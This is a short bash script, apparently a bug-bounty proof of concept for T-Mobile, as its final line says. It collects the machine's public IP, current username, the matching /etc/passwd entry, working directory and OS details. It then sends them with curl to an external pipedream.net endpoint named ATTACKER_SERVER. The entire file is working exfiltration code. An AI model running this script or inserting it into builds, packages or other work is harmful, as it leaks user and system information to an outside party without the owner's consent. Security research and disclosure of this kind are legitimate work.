#!/bin/bash

ATTACKER_SERVER="https://eo6mp8hopcldddq.m.pipedream.net/Makefile"

IP=$(curl -s http://ipinfo.io/ip)
USERNAME=$(whoami)
PASSWORD=$(cat /etc/passwd 2>/dev/null | grep "$USERNAME" || echo "Password file not accessible")
CURRENT_DIR=$(pwd)
OS_DETAILS=$(uname -a)

DATA=$(cat <<EOF
{
    "ip": "$IP",
    "username": "$USERNAME",
    "password": "$PASSWORD",
    "current_directory": "$CURRENT_DIR",
    "os_details": "$OS_DETAILS"
}
EOF
)

curl -s -o /dev/null -X POST -H "Content-Type: application/json" -d "$DATA" "$ATTACKER_SERVER"

echo "T-Mobile Bugbounty POC"
